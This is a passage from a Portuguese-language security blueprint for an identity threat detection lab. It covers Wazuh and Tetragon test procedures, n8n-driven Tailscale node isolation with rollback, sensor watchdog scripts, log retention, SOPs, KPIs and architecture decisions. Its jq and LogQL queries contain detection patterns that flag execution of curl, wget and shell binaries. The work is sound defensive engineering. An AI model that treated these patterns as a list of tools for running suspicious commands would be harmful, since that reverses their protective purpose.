  jq 'select(.process_exec.binary | test("curl|wget|bash|sh")) |
      {binary: .process_exec.binary, pod: .process_exec.pod.name, time: .time}'
```

**Verificação no Wazuh:**

```bash
sudo docker exec wazuh-manager \
  grep '"id":"100201"' /var/ossec/logs/alerts/alerts.json | \
  jq '{rule: .rule.description, level: .rule.level, time: .timestamp}'
```

**Registro de resultado:**

| Campo | Valor |
|-------|-------|
| Data de execução | _____________ |
| Binário executado | _____________ |
| Evento no Tetragon (S/N) | _____________ |
| Alerta Wazuh level 14 (S/N) | _____________ |
| Aprovado (S/N) | _____________ |

---

### 5.3 Use Case UC-03: Isolamento Automático de Nó via SOAR

**Objetivo:** Validar que o workflow n8n recebe o alerta do Wazuh, patcha a ACL do Tailscale e notifica o Slack em menos de 2 minutos.

**Procedimento de Teste:**

```bash
# 1. Disparar um alerta simulado diretamente no webhook do n8n
curl -X POST http://<IP-AUTOMATION>:5678/webhook/wazuh-alert \
  -H "Content-Type: application/json" \
  -d '{
    "rule": {
      "id": "100211",
      "level": 15,
      "description": "ITDR CRITICO: BOLA no MidPoint + execucao suspeita",
      "groups": ["itdr_critical"]
    },
    "agent": {
      "id": "002",
      "name": "vm-midpoint",
      "ip": "100.x.x.x"
    },
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
  }'

# 2. Monitorar execução do workflow no painel n8n
# http://<IP-AUTOMATION>:5678 → Executions

# 3. Verificar que regra de deny foi adicionada na ACL Tailscale
curl -s https://api.tailscale.com/api/v2/tailnet/<TAILNET>/acl \
  -H "Authorization: Bearer <TAILSCALE_API_KEY>" | \
  jq '.acls[] | select(.action == "deny")'
```

**Validação de rollback (OBRIGATÓRIO após o teste):**

```bash
# IMPORTANTE: Remover a regra de isolamento após validação
# O script de rollback remove entradas SENTINEL-AUTO-ISOLATE da ACL

python3 - <<'EOF'
import requests, json, os

TAILNET = os.environ["TAILNET"]
API_KEY = os.environ["TAILSCALE_KEY"]
headers = {"Authorization": f"Bearer {API_KEY}", "Content-Type": "application/json"}

acl = requests.get(f"https://api.tailscale.com/api/v2/tailnet/{TAILNET}/acl",
                   headers=headers).json()

# Remover regras de isolamento automático
acl["acls"] = [r for r in acl.get("acls", [])
               if "SENTINEL-AUTO-ISOLATE" not in r.get("_comment", "")]

r = requests.post(f"https://api.tailscale.com/api/v2/tailnet/{TAILNET}/acl",
                  headers=headers, json=acl)
print(f"ACL restaurada: HTTP {r.status_code}")
EOF
```

**Registro de resultado:**

| Campo | Valor |
|-------|-------|
| Data de execução | _____________ |
| Tempo total do workflow (s) | _____________ |
| ACL atualizada (S/N) | _____________ |
| Notificação Slack recebida (S/N) | _____________ |
| Token revogado no Vault (S/N) | _____________ |
| Rollback executado (S/N) | _____________ |
| Aprovado (S/N) | _____________ |

---

## 6. Fase 4 — Sustentação e Governança

### 6.1 Monitoramento de Saúde dos Sensores

#### 6.1.1 Watchdog do Tetragon

```bash
# /usr/local/bin/tetragon-watchdog.sh
#!/bin/bash

LOG_FILE="/var/log/tetragon/events.json"
WAZUH_LOG="/var/ossec/logs/active-responses.log"
THRESHOLD_SECONDS=300   # 5 minutos sem eventos = sensor morto

if [ ! -f "$LOG_FILE" ]; then
  DELTA=99999
else
  LAST=$(stat -c %Y "$LOG_FILE" 2>/dev/null || echo 0)
  NOW=$(date +%s)
  DELTA=$((NOW - LAST))
fi

if [ "$DELTA" -gt "$THRESHOLD_SECONDS" ]; then
  echo "{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",\
\"integration\":\"sentinel-watchdog\",\
\"alert\":\"TETRAGON_SENSOR_DEAD\",\
\"delta_seconds\":${DELTA},\
\"severity\":\"critical\",\
\"host\":\"$(hostname)\"}" >> "$WAZUH_LOG"
fi
```

```bash
# Instalar como cron a cada 5 minutos
chmod +x /usr/local/bin/tetragon-watchdog.sh
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/local/bin/tetragon-watchdog.sh") | crontab -
```

#### 6.1.2 Dashboard de Saúde no Grafana

Criar painel no Grafana com as queries LogQL a seguir:

```logql
# Taxa de eventos Tetragon por namespace (últimas 1h)
sum by (namespace) (
  rate({job="tetragon-ebpf"}[5m])
)

# Eventos de execução suspeita
{job="tetragon-ebpf", namespace="iga-prod"}
| json
| binary=~"sh|curl|wget|python"
| line_format "{{.binary}} @ {{.pod_name}} — {{.time}}"

# Últimas 20 conexões TCP de saída do MidPoint
{job="tetragon-ebpf", namespace="midpoint"}
| json
| __error__=""
| line_format "{{.dst_ip}}:{{.dst_port}} from {{.pod_name}}"
| limit 20
```

### 6.2 Plano de Retenção de Logs (ISO 27001)

| Tipo de Log | Localização | Retenção | Método de Integridade |
|-------------|-------------|----------|----------------------|
| Alerts Wazuh (`alerts.json`) | `/mnt/wazuh-data/ossec_logs/alerts/` | 90 dias | SHA-256 diário (cron) |
| Archives Wazuh (`archives.json`) | `/mnt/wazuh-data/ossec_logs/archives/` | 30 dias (mínimo ISO) | Assinatura GPG |
| Logs Loki (chunks) | `/mnt/loki-data/chunks/` | 30 dias (configurado) | Loki compactação nativa |
| Eventos Tetragon brutos | `/var/log/tetragon/events.json` (nós) | 7 dias (rotação local) | Enviados ao Loki |
| Eventos Sysmon AD | Forwarded via Wazuh Agent | 30 dias | Integrado ao Wazuh |

```bash
# Script de integridade diária dos archives Wazuh
# /etc/cron.daily/wazuh-archive-integrity.sh
#!/bin/bash
DATE=$(date +%Y/%b/%d)
ARCHIVE_DIR="/mnt/wazuh-data/ossec_logs/archives/$DATE"
HASH_FILE="/mnt/wazuh-data/ossec_logs/archives/integrity-$DATE.sha256"

if [ -d "$ARCHIVE_DIR" ]; then
  find "$ARCHIVE_DIR" -type f -name "*.json.gz" | \
    xargs sha256sum > "$HASH_FILE"
  echo "Hashes gerados: $HASH_FILE"
fi
```

### 6.3 Procedimentos Operacionais Padrão (SOP)

#### SOP-01: Resposta a Alerta Crítico ITDR

```
1. Receber notificação no Slack (#security-incidents)
2. Verificar execução do workflow n8n (http://<AUTOMATION>:5678/executions)
3. Confirmar isolamento na ACL Tailscale (tailscale status --json)
4. Investigar evento raiz no Grafana Loki (query por pod_name + timestamp)
5. Verificar se token foi revogado no HashiCorp Vault
6. Documentar no ticket ITSM com evidence dos logs
7. Executar rollback da ACL após confirmação de contenção
8. Gerar relatório de incidente com evidências para ISO 27001
```

#### SOP-02: Manutenção Mensal

```
- Verificar versão do Tetragon (helm upgrade se disponível)
- Revisar regras Wazuh com falsos positivos (ajustar frequências)
- Verificar integridade dos hashes de archive
- Testar conectividade dos agentes (wazuh-control status)
- Revisar ACLs do Tailscale (remover regras SENTINEL obsoletas)
- Atualizar inventário de APIs no Akto (re-executar discovery)
```

---

## 7. KPIs e Métricas de Sucesso

### 7.1 KPIs Técnicos

| KPI | Meta | Frequência de Medição | Query de Medição |
|-----|------|----------------------|------------------|
| Cobertura de nós monitorados | 100% dos nós IGA com agente ativo | Diária | `wazuh-control list-agents` |
| Latência de detecção BOLA | < 60 segundos | Por incidente | Timestamp Akto → Timestamp Wazuh |
| Uptime do sensor Tetragon | > 99% | Semanal | Ausência de alertas `TETRAGON_SENSOR_DEAD` |
| Tempo de resposta SOAR (isolamento) | < 2 minutos | Por incidente | Timestamp alerta → Timestamp ACL atualizada |
| Taxa de falsos positivos | < 5% dos alertas | Semanal | Revisão manual de alertas level >= 12 |
| Eventos Tetragon processados/hora | Baseline após semana 1 | Contínua | LogQL Loki rate() |

### 7.2 KPIs de Governança

| KPI | Meta | Frequência |
|-----|------|------------|
| Conformidade de retenção de logs | 100% dos logs com retenção >= 30 dias | Mensal |
| Cobertura de endpoints catalogados no Akto | 100% das APIs documentadas | Semanal |
| Tempo médio entre revisões de ACL Tailscale | <= 30 dias | Mensal |
| Incidentes documentados com evidência completa | 100% | Por incidente |

### 7.3 Template de Registro de Progresso

```markdown
## Semana N — [Data de início] a [Data de fim]

### Atividades executadas
- [ ] Fase X — Etapa Y: [descrição]
- [ ] Use Case UC-0X: [resultado]

### KPIs da semana
| KPI | Valor medido | Meta | Status |
|-----|-------------|------|--------|
| Cobertura de nós | X/Y | 100% | 🟢/🟡/🔴 |
| Latência de detecção | Xs | < 60s | 🟢/🟡/🔴 |

### Obstáculos e decisões
- [Descrever obstáculos encontrados e decisões tomadas]

### Próximos passos
- [ ] [Próxima atividade]
```

---

## 8. Registro de Decisões de Arquitetura (ADR)

### ADR-001: Abandono do Suricata (NIDS) em favor do Tetragon (eBPF)

**Status:** Aceito  
**Data:** Abril 2026  
**Contexto:** O ambiente ZTNA com Tailscale criptografa todo tráfego entre nós, tornando a inspeção de rede por assinatura ineficaz.  
**Decisão:** Utilizar Tetragon para monitoramento no kernel — anterior à criptografia — em substituição ao Suricata.  
**Consequências:** Overhead reduzido (~128 MB RAM vs ~512 MB Suricata), sem pontos cegos de criptografia. Exige kernel Linux >= 5.10 nas VMs.

---

### ADR-002: Grafana Loki em vez de Elasticsearch para armazenamento de logs

**Status:** Aceito  
**Data:** Abril 2026  
**Contexto:** Elasticsearch requer tipicamente 4–8 GB RAM por nó para indexação performática, incompatível com o orçamento de hardware do Living Lab.  
**Decisão:** Adotar Grafana Loki, que indexa apenas labels e não o conteúdo completo dos logs, operando com ~512 MB RAM.  
**Consequências:** Consultas por conteúdo são mais lentas que no Elasticsearch, porém adequadas para o volume do Living Lab. Conformidade ISO 27001 mantida via configuração de retenção.

---

### ADR-003: n8n como SOAR em vez de Shuffle

**Status:** Aceito  
**Data:** Abril 2026  
**Contexto:** Ambos são open source. n8n oferece nó de HTTP Request nativo com suporte a lógica JavaScript inline, facilitando o patch de ACL Tailscale sem plugins adicionais.  
**Decisão:** n8n pelo suporte nativo a lógica de transformação de ACL em JSON e pela interface mais madura.  
**Consequências:** n8n não é um SOAR nativo de segurança — integrações com plataformas de threat intelligence (MISP, OpenCTI) exigem nós HTTP customizados.

---

### ADR-004: Sysmon como substituto funcional do eBPF no Windows AD

**Status:** Aceito  
**Data:** Abril 2026  
**Contexto:** Tetragon não suporta Windows. O Active Directory é um componente crítico do stack IGA e não pode ficar sem visibilidade comportamental.  
**Decisão:** Sysmon com perfil SwiftOnSecurity, coletando EID 1 (Process Create), EID 3 (Network Connection) e EID 10 (Process Access) via Wazuh Agent.  
**Consequências:** Visibilidade no AD é comportamentalmente equivalente ao Tetragon em Linux para os casos de uso ITDR relevantes. Não há visibilidade de ring buffer de kernel, mas os eventos ETW cobrem os vetores de ataque documentados.

---

*Blueprint PRJ016 — Sentinel Identity Shield*  
*Living Lab — Versão 1.0 — Abril 2026*  
*Documento vivo: atualizar a cada sprint de implementação*
